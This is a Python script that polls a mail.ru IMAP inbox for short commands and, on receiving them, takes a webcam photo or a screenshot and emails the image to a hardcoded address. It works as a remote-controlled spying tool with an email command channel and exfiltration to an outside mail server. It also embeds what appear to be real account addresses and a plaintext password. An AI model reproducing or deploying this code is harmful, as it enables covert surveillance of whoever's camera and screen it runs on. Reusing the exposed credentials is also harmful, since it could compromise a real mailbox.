import cv2
import os
import smtplib
import imaplib
import email
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Manager, freeze_support
from email.mime.base import MIMEBase
from email import encoders
import pyscreenshot 
import mss 

def create_message(from_ad, to_ad, text):
    msg = MIMEMultipart()
    msg["From"] = from_ad
    msg["To"] = to_ad
    msg["Subject"] = "Фото с камеры"
    msg.attach(MIMEText(text, "plain"))

    image_path = "./screenshot.jpg"
    with open(image_path, "rb") as img:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(img.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(image_path)}")
        msg.attach(part)

    return msg.as_string()

def connect_smtp(messages, from_ad, to_ad, mypass):
    try:
        server = smtplib.SMTP_SSL('smtp.mail.ru', 465)
        server.login(from_ad, mypass)

        for msg in messages:
            server.sendmail(from_ad, to_ad, msg)
            server.sendmail(from_ad, from_ad, msg)

        server.quit()
        print(" Почта отправлена!")

    except Exception as e:
        print(f" Ошибка при отправке почты: {e}")

def MailSender(ready):
    fromaddr = "gimnazia587@mail.ru"
    toaddr = "9662061@mail.ru"
    mypass = "FepNbhy2UJhCxxLKWdez"

    while True:
        if ready.value == 'foto':
            print('📷 Включаю камеру...')
            cam = cv2.VideoCapture(0) 

            ret, frame = cam.read()
            if ret:
                image_path = "./screenshot.jpg"
                cv2.imwrite(image_path, frame)
                print("📸 Фото сделано!")

                messages = [
                    create_message(fromaddr, toaddr, "Твое фото!")
                ]
                connect_smtp(messages, fromaddr, toaddr, mypass)

            cam.release() 
            print("📴 Камера выключена.")

            ready.value = '' 
        elif ready.value == 'scrin':
            print('делаю скрин')
            image_path = "./screenshot.jpg"

            with mss.mss() as sct:
                sct.shot(output=image_path) 
            messages = [
                create_message(fromaddr, toaddr, "Твой скрин!")
            ]
            connect_smtp(messages, fromaddr, toaddr, mypass)

           

            ready.value = '' 

def ImapListener(ready):
    fromaddr = "gimnazia587@mail.ru"
    mypass = "FepNbhy2UJhCxxLKWdez"

    while True:
        try:
            imap = imaplib.IMAP4_SSL("imap.mail.ru")
            imap.login(fromaddr, mypass)
            imap.select("INBOX/ToMyself")

            messages = imap.search(None, "UNSEEN")[1][0]
            if not messages:
                continue

            mes = messages.decode().split()
            res, msg = imap.fetch(f'{mes[-1]}', '(RFC822)')
            msg = email.message_from_bytes(msg[0][1])

            for part in msg.walk():
                if part.get_content_maintype() == 'text' and part.get_content_subtype() == 'plain':
                    text = base64.b64decode(part.get_payload()).decode().strip()
                    if text == "1":
                        ready.value = 'foto'
                        print(" Команда принята!")
                    elif text == "2":
                        ready.value = 'scrin'
                        print(" Команда принята!")

        except imaplib.IMAP4.abort:
            continue

if __name__ == '__main__':
    freeze_support()
    manager = Manager()
    ready = manager.Value(str, '')

    with ThreadPoolExecutor(max_workers=2) as pool:
        pool.submit(ImapListener, ready)
        pool.submit(MailSender, ready)